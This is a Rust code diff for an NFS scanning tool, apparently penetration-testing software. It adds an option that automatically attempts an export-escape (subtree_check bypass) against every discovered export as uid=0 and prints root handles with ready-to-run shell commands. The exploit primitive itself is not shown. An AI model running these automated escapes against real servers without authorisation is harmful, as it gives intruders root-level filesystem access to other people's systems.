@@ -8,13 +8,16 @@
 //! `analyze` and `shell` territory.
 
 use std::path::PathBuf;
+use std::sync::Arc;
 use std::time::Duration;
 
 use clap::Parser;
 use colored::Colorize as _;
 use tabled::builder::Builder;
 use tabled::settings::Style;
+use tokio::sync::{Mutex, Semaphore};
 
+use crate::cli::escape::{self, EscapeOutcome};
 use crate::cli::{GlobalOpts, H_BEHAVIOR, H_OUTPUT, H_TARGET};
 use crate::engine::scan_types::{HostResult, NfsPortInfo};
 use crate::engine::scanner::{ScanConfig, ScanOutput, Scanner};
@@ -61,6 +64,14 @@ pub struct ScanArgs {
     /// portmapper discovery or the 2049 fallback).
     #[arg(long, value_delimiter = ',', value_name = "PORT,...", help_heading = H_BEHAVIOR)]
     pub nfs_port: Vec<u16>,
+
+    /// After discovery, automatically attempt an export escape (subtree_check
+    /// bypass) against every discovered export path. On success, prints a
+    /// ready-to-run `nfswolf shell --handle` command for the escaped filesystem
+    /// root. The escape probe runs as uid=0 (to tell root_squash apart from a
+    /// rejected handle); honours --proxy and --delay/--jitter.
+    #[arg(long, help_heading = H_BEHAVIOR)]
+    pub auto_escape: bool,
 
     /// Write JSON results to FILE (machine-readable, UTF-8).
     /// Can be used simultaneously with --csv.
@@ -142,6 +153,11 @@ pub async fn run(args: ScanArgs, globals: &GlobalOpts) -> anyhow::Result<()> {
         std::process::exit(130);
     }
 
+    // Auto-escape pass: only on a complete scan (a Ctrl+C above already exited).
+    if args.auto_escape {
+        run_auto_escape(&results, globals, args.concurrency).await;
+    }
+
     if show_progress {
         let nfs_count = results.len();
         eprintln!("{}", crate::output::status_info(&format!("Done in {}  --  {} host(s) scanned, {} with NFS", crate::output::elapsed(start), total, nfs_count)));
@@ -149,6 +165,111 @@ pub async fn run(args: ScanArgs, globals: &GlobalOpts) -> anyhow::Result<()> {
 
     crate::cli::emit_replay(globals);
     Ok(())
+}
+
+// --- Auto-escape pass --------------------------------------------------------
+
+/// One export's auto-escape result, tagged with the host's position in the scan
+/// output so results print in stable host/export order regardless of which
+/// concurrent task finishes first.
+struct AutoEscapeResult {
+    /// Index of the host in the scan `results` slice (for stable ordering).
+    idx: usize,
+    /// Host the escape was attempted against (IP string).
+    host: String,
+    /// Export path the escape targeted.
+    export: String,
+    /// `Ok(outcome)` from the escape primitive, or `Err(message)` when the
+    /// MOUNT/connection step failed before any handle could be probed.
+    outcome: Result<EscapeOutcome, String>,
+}
+
+/// Attempt an export escape against every discovered export path and print a
+/// ready-to-run `nfswolf shell --handle` command for each one that breaks out
+/// to the filesystem root.
+///
+/// Reuses the shared `escape::find_escape` primitive so the bypass logic is
+/// identical to the standalone `escape` subcommand. Escapes run with bounded
+/// concurrency (mirroring the scan fan-out); results are collected and printed
+/// in host/export order once every attempt completes.
+async fn run_auto_escape(results: &[HostResult], globals: &GlobalOpts, concurrency: usize) {
+    // Collect (host-index, host, export) targets: the union of v2/v3/v4 export
+    // paths per host, deduplicated since a path can appear in more than one
+    // version's list.
+    let mut targets: Vec<(usize, String, String)> = Vec::new();
+    for (idx, r) in results.iter().enumerate() {
+        let host = r.ip.to_string();
+        let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
+        let v3 = r.exports_v3.iter().flatten().map(|e| e.path.clone());
+        let v2 = r.exports_v2.iter().flatten().map(|e| e.path.clone());
+        let v4 = r.exports_v4.iter().flatten().map(|e| e.path.clone());
+        for path in v3.chain(v2).chain(v4) {
+            if seen.insert(path.clone()) {
+                targets.push((idx, host.clone(), path));
+            }
+        }
+    }
+
+    if targets.is_empty() {
+        eprintln!("{}", crate::output::status_warn("Auto-escape: no exports discovered to escape"));
+        return;
+    }
+
+    eprintln!("{}", crate::output::status_info(&format!("Auto-escape: attempting export breakout on {} path(s)...", targets.len())));
+
+    // Bounded-concurrency escape pass, mirroring the scan fan-out. Cap below the
+    // scan concurrency since each escape is heavier (MOUNT + up to ~200 GETATTRs).
+    let limit = concurrency.clamp(1, 32);
+    let sem = Arc::new(Semaphore::new(limit));
+    let collected = Arc::new(Mutex::new(Vec::<AutoEscapeResult>::new()));
+
+    let mut handles = Vec::with_capacity(targets.len());
+    for (idx, host, export) in targets {
+        let sem = Arc::clone(&sem);
+        let collected = Arc::clone(&collected);
+        let g = globals.clone();
+        let handle = tokio::spawn(async move {
+            let _permit = sem.acquire_owned().await;
+            let outcome = match escape::find_escape(&host, &export, escape::DEFAULT_BTRFS_SUBVOLS, escape::DEFAULT_MAX_ROOT_SCAN, &g, false).await {
+                Ok((_client, outcome)) => Ok(outcome),
+                Err(e) => Err(e.to_string()),
+            };
+            collected.lock().await.push(AutoEscapeResult { idx, host, export, outcome });
+        });
+        handles.push(handle);
+    }
+    for handle in handles {
+        let _ = handle.await;
+    }
+
+    // Drain and sort into stable host/export order for printing.
+    let mut all = std::mem::take(&mut *collected.lock().await);
+    all.sort_by(|a, b| a.idx.cmp(&b.idx).then_with(|| a.export.cmp(&b.export)));
+
+    let mut escaped = 0usize;
+    for res in &all {
+        match &res.outcome {
+            Ok(EscapeOutcome::Success { candidate, note }) => {
+                escaped += 1;
+                let hex = candidate.root_handle.to_hex();
+                println!();
+                println!("{}", crate::output::status_ok(&format!("{}:{} escaped  --  {:?} inode {} ({note})", res.host, res.export, candidate.fs_type, candidate.inode_number)));
+                crate::output::print_handle("Root handle", &hex);
+                println!("    {} shell {} --handle {}", "nfswolf".dimmed(), res.host, hex.cyan());
+            },
+            Ok(EscapeOutcome::StaleNoRoot) => {
+                println!("  {}", format!("{}:{}  handle valid but root not found (raise `escape --max-root-scan`)", res.host, res.export).dimmed());
+            },
+            Ok(EscapeOutcome::Unsupported) => {
+                println!("  {}", format!("{}:{}  not escapable (BADHANDLE / non-Linux handle)", res.host, res.export).dimmed());
+            },
+            Err(e) => {
+                println!("  {}", format!("{}:{}  escape failed: {e}", res.host, res.export).dimmed());
+            },
+        }
+    }
+
+    eprintln!("{}", crate::output::status_info(&format!("Auto-escape complete: {escaped} of {} path(s) escaped", all.len())));
 }
 
 // --- Table output ------------------------------------------------------------
